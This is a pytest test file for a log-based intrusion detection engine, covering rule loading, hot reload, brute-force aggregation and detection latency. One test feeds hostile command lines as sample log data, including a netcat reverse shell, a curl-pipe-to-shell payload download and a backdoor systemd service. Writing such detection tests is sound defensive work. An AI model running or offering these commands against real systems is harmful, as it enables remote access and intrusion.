import importlib.util
import sys
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]


def load_engine():
    path = ROOT / "services" / "detection_engine" / "engine.py"
    spec = importlib.util.spec_from_file_location("detection_engine_tests", path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def event(index=0, **overrides):
    payload = {
        "event_id": f"evt-{index}",
        "timestamp": "2026-05-16T18:00:00+00:00",
        "host": "core-1",
        "source_ip": "203.0.113.10",
        "destination_ip": "",
        "event_type": "FAILED_LOGIN",
        "severity": "MEDIUM",
        "username": "admin",
        "raw_log": "Failed password for admin from 203.0.113.10 port 51222 ssh2",
        "tags": ["ssh"],
        "technique": "T1110",
        "service": "ssh",
    }
    payload.update(overrides)
    return payload


def test_rule_loading_yaml_and_mitre_mapping():
    engine_module = load_engine()
    rules = engine_module.RuleSet(ROOT / "infra" / "detection_rules")
    assert rules.maybe_reload() is True
    ids = {rule["id"] for rule in rules.rules}
    assert {"ssh_bruteforce", "reverse_shell", "sudo_abuse", "suspicious_curl_wget", "persistence_indicators"}.issubset(ids)
    brute = next(rule for rule in rules.rules if rule["id"] == "ssh_bruteforce")
    assert brute["mitre"]["technique"] == "T1110"
    assert brute["severity"] == "HIGH"


def test_hot_reload_detects_rule_file_change(tmp_path):
    engine_module = load_engine()
    rule = tmp_path / "one.yaml"
    rule.write_text(
        "id: one\nname: One\nseverity: LOW\ncondition:\n  event_type: TEST\nmitre:\n  tactic: Test\n  technique: T0000\n",
        encoding="utf-8",
    )
    rules = engine_module.RuleSet(tmp_path)
    assert rules.maybe_reload() is True
    assert rules.maybe_reload() is False
    time.sleep(0.01)
    rule.write_text(
        "id: one\nname: One Changed\nseverity: HIGH\ncondition:\n  event_type: TEST\nmitre:\n  tactic: Test\n  technique: T0001\n",
        encoding="utf-8",
    )
    assert rules.maybe_reload() is True
    assert rules.rules[0]["severity"] == "HIGH"


def test_bruteforce_and_failed_login_aggregation():
    engine_module = load_engine()
    engine = engine_module.DetectionEngine(ROOT / "infra" / "detection_rules")
    alerts = []
    for index in range(5):
        alerts.extend(engine.evaluate(event(index)))

    brute = [alert for alert in alerts if alert["internal_rule_id"] == "ssh_bruteforce"]
    failed = [alert for alert in alerts if alert["internal_rule_id"] == "multiple_failed_logins"]
    assert brute
    assert brute[-1]["severity"] == "HIGH"
    assert brute[-1]["risco"] >= 80
    assert brute[-1]["mitre_id"] == "T1110"
    assert brute[-1]["event_count"] >= 5
    assert failed


def test_reverse_shell_sudo_curl_and_persistence_rules():
    engine_module = load_engine()
    engine = engine_module.DetectionEngine(ROOT / "infra" / "detection_rules")

    reverse = engine.evaluate(
        event(1, event_type="REVERSE_SHELL", service="bash", raw_log="nc -e /bin/sh 203.0.113.10 4444", severity="HIGH")
    )
    assert any(alert["internal_rule_id"] == "reverse_shell" and alert["mitre_id"] == "T1059" for alert in reverse)

    sudo = engine.evaluate(
        event(2, event_type="SUDO_COMMAND", service="sudo", raw_log="sudo: codex COMMAND=/usr/bin/passwd root", username="codex")
    )
    assert any(alert["internal_rule_id"] == "sudo_abuse" for alert in sudo)

    curl = engine.evaluate(event(3, event_type="SUSPICIOUS_DOWNLOAD", service="syslog", raw_log="curl http://203.0.113.5/payload.sh | sh"))
    assert any(alert["internal_rule_id"] == "suspicious_curl_wget" and alert["mitre_id"] == "T1105" for alert in curl)

    persistence = engine.evaluate(
        event(4, event_type="PERSISTENCE_INDICATOR", service="syslog", raw_log="systemctl enable backdoor.service")
    )
    assert any(alert["internal_rule_id"] == "persistence_indicators" for alert in persistence)


def test_metrics_friendly_detection_latency_path():
    engine_module = load_engine()
    engine = engine_module.DetectionEngine(ROOT / "infra" / "detection_rules")
    start = time.perf_counter()
    engine.evaluate(event())
    assert time.perf_counter() - start < 0.5
